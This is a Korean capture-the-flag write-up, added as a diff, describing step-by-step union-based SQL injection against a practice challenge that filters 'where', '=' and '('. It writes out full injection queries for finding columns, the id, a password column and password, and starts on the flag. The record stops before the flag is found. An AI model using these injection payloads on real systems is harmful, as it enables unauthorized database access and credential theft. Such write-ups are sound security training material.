@@ -1,0 +1,57 @@
+힌트를 보니 sql injection 문제라고하며
+with adm1nkyj 라고 써있는 것으로 봐서는 전에 풀었던 adm1nkyj 문제와 비슷한 유형일 것으로 예상된다.
+
+문제에 접속하니 adm1nkyj 문제처럼 바로 소스가 나온다.
+
+소스를 읽어보자.
+
+소스를 읽어보니 adm1nkyj 문제와 대부분의 부분들은 전부 다 똑같고
+$pw === $tmp_pw && $flags === $tmp_flag 조건을 맞춰야되는게 목적인 것도 
+똑같다.
+
+그러나 다른 점은 이번에는 메타데이터를 사용못하게 하는 것과 함께 where,=,( 를 못 쓰게 하였다.
+
+저번 문제에서 풀었던 대로라면 
+1. 속성갯수와 순서 구하기
+2. id값 구하기
+3. pw값 구하기
+4. flag값 구하기
+
+위와 같은 순서로 문제풀이가 되야한다.
+
+1번부터 해보자
+SELECT * FROM findflag_2 WHERE $id_column='' union select 1,2,3,4,5 %23' and $pw_column='{$pw}'
+위와 같은 쿼리로 무난하게 구할 수 있을 것 같다.
+
+구해보니 저번 문제와 똑같이 속성 5개에 id속성은 두번째 속성으로 나왔다.
+
+이제 2번을 해보자
+SELECT * FROM findflag_2 WHERE $id_column='' or 1 order by 5 %23' and $pw_column='{$pw}'
+$id값도 저번 문제처럼 위와 같은 쿼리로 무난하게 구할 수 있을 것이다.
+
+구해보니 $id값은 zairowkdlfhdkel라는 값이 나왔다.
+
+3번 차례인데 pw값을 구해야 한다.
+저번 문제의 경우 pw값을 구하기 전에 pw_column을 먼저 구했었다.
+SELECT * FROM findflag_2 WHERE $id_column='' union select 1,' and $pw_column=',3,4,5 %23'
+이번에도 저번 문제와 똑같은 방법 union injection으로 구하면 풀릴 것이다.
+
+풀어보니 $pw_column이 xvvcPw4coaa1sslfe이라는 값이 나왔다.
+
+이제 pw값을 구해보자
+SELECT * FROM findflag_2 WHERE $id_column='' union select 1,xvvcPw4coaa1sslfe,3,4,5 from findflag_2 %23'
+이번에도 역시 저번 문제와 똑같이 풀면 해결 될 것이다. (이쯤되니 문제를 너무 똑같이 낸거 아닌가 하는 생각이 든다;;;)
+
+$pw값이 wkdlfhpw!!@%%#@@#이 나왔다.
+
+이제 마지막으로 대망의 4번 flag값을 구해보자!
+저번 문제에서도 flag값을 구하는 것이 가장 힘들었었는데
+역시 이번문제에서도 flag값을 구하는 것이 가장 힘들것 같다.
+우선 flag값을 구하는데 있어서 저번과 같은 방법을 사용 할 수는 없다.
+SELECT * FROM findflag_2 WHERE $id_column='' union select 1,flag,3,4,5 from(select 1,2,3,4 flag,5 union select * from findflag_2 limit 1,1)x'
+
+왜냐하면 위 쿼리가 저번 문제의 풀이 쿼리인데 여기서는 ( 가 사용이 됐기 때문이다.
+
+SELECT * FROM findflag_2 WHERE $id_column='' union select * from findflag_2 union select 1,2,3,'a',5 order by 4 asc 
+
+
